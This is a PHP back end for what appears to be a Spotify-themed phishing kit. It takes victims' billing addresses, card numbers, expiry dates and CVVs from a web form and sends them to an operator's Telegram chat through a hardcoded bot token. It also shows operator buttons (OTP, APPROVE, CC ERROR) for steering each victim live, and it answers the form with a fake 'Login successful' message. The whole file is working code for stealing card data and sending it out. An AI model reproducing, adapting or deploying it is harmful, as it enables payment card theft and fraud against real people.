<?php

// Define your bot token
$botToken = "7764284417:AAE9-ADJoUIFoXjNuZclwFI8yJOpKRcINMQ"; // Replace with your bot's API token
$telegramApiUrl = "https://api.telegram.org/bot$botToken";

// Define the chat ID (default chat for sending messages)
$chatId = "1690728339"; // Replace with your chat ID

class SendToTelegram
{
    private $telegramApiUrl;
    private $botToken;

    public function __construct($botToken)
    {
        $this->botToken = $botToken;
        $this->telegramApiUrl = "https://api.telegram.org/bot$botToken";
    }

    // Method to send a message
    public function sendMessage($chatId, $message, $keyboard = null)
    {
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML',
        ];

        if ($keyboard) {
            $data['reply_markup'] = json_encode($keyboard);
        }

         $this->sendRequest("/sendMessage", $data);

        header('Content-Type: application/json');
        echo json_encode([
            'status' => 'success',
            'message' => 'Login successful',
        ]);
    }

    // Method to handle incoming webhook updates
    public function handleWebhook()
    {
        // Read incoming request
        $update = json_decode(file_get_contents("php://input"), true);

        if (!$update) {
            http_response_code(400);
            echo json_encode(['error' => 'Invalid request']);
            exit;
        }

        // Check if update contains a callback query
        if (isset($update['callback_query'])) {
            $callbackQuery = $update['callback_query'];
            $callbackData = $callbackQuery['data'];
            $callbackId = $callbackQuery['id'];
            $fromUser = $callbackQuery['from']['username'] ?? 'unknown';

            // Handle callback query data
            switch (true) {
                case str_contains($callbackData, 'cc2_'):
                    $responseMessage = "CC ERROR handled by @$fromUser.";
                    break;
                case str_contains($callbackData, 'otp_'):
                    $responseMessage = "OTP handled by @$fromUser.";
                    break;
                case str_contains($callbackData, 'done_'):
                    $responseMessage = "Action marked DONE by @$fromUser.";
                    break;
                default:
                    $responseMessage = "Unhandled callback: $callbackData";
            }

            // Acknowledge the callback query
            $this->sendRequest("/answerCallbackQuery", [
                'callback_query_id' => $callbackId,
                'text' => 'Action received!',
            ]);

            // Send a message to the chat
            $this->sendMessage($GLOBALS['chatId'], $responseMessage);

        } elseif (isset($update['message'])) {
            $message = $update['message'];
            $chatId = $message['chat']['id'];

            // Respond to a regular message
            $responseMessage = "Hello! I am your bot. How can I assist you?";
            $this->sendMessage($chatId, $responseMessage);
        }
    }

    // General method to send API requests
    public function sendRequest($endpoint, $data)
    {
        $url = $this->telegramApiUrl . $endpoint;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log("CURL error: " . curl_error($ch));
            return false;
        }

        curl_close($ch);
        return $response;
    }
}

// Instantiate the class
$telegram = new SendToTelegram($botToken);

// Handle POST requests for form submissions or webhook updates
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST)) {
        // Form submission handling
        $addressLine = $_POST['AddressLine'] ?? 'N/A';
        $city = $_POST['city'] ?? 'N/A';
        $state = $_POST['state'] ?? 'N/A';
        $zipCode = $_POST['zipCode'] ?? 'N/A';
        $ccHolder = $_POST['cc_holder'] ?? 'N/A';
        $ccNumber = $_POST['cc_number'] ?? 'N/A';
        $expirationDate = $_POST['exp'] ?? 'N/A';
        $cvv = $_POST['cvv'] ?? 'N/A';
        $unique_id = $_POST['unique_id'] ?? 'N/A';

        // Format the message
        $message = "New Data Received:\n";
        $message .= "Address Line: $addressLine\n";
        $message .= "City: $city\n";
        $message .= "State: $state\n";
        $message .= "Zip Code: $zipCode\n";
        $message .= "Card Holder: $ccHolder\n";
        $message .= "Card Number: $ccNumber\n";
        $message .= "Expiration Date: $expirationDate\n";
        $message .= "CVV: $cvv\n";
        $message .= "Unique_ID: $unique_id\n";

        // Define the keyboard
        $keyboard = [
            "inline_keyboard" => [
                [
                    ["text" => "CC ERROR", "callback_data" => "cc2_" . $unique_id],
                    ["text" => "OTP", "callback_data" => "otp_" . $unique_id],
                    ["text" => "OTP ERROR", "callback_data" => "otp2_" . $unique_id],
                    ["text" => "APPROVE", "callback_data" => "app_" . $unique_id],
                    ["text" => "APPROVE ERROR", "callback_data" => "app2_" . $unique_id],
                    ["text" => "DONE", "callback_data" => "done_" . $unique_id],
                ],
            ],
        ];

        $telegram->sendMessage($GLOBALS['chatId'], $message, $keyboard);
    } else {
        // Webhook handling
        $telegram->handleWebhook();
    }
} else {
    // Optional: Set webhook URL (GET request)
    $webhookUrl = "https://spotytwist.onrender.com/telegramCallBack.php"; // Replace with your webhook URL
    $response = $telegram->sendRequest("/setWebhook", [
        'url' => $webhookUrl,
    ]);

    echo "Webhook setup response: " . $response;
}
